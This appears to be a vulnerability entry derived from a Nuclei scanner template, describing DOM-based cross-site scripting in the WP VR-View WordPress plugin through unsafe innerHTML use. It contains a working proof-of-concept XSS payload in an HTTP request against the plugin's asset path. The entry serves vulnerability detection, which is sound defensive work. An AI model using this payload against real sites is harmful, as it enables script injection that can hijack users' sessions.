# Vulnerability: WP VR-View Plugin - Cross-Site Scripting
**Classification:** WP
**Source:** Nuclei Template (`wp-vr-view-xss.yaml`)

## Description
While testing the VRView web application, we discovered a DOM Based Cross-Site Scripting Vulnerability in the handling of errors through an inappropriate use of the "innerHTML" property. The use of this property must be combined with the encoding of the data before it is used for data assignment, and in this case, it wasn't used safely.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /wp-content/plugins/wp-vr-view/asset/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
Host: {{Hostname}}
```

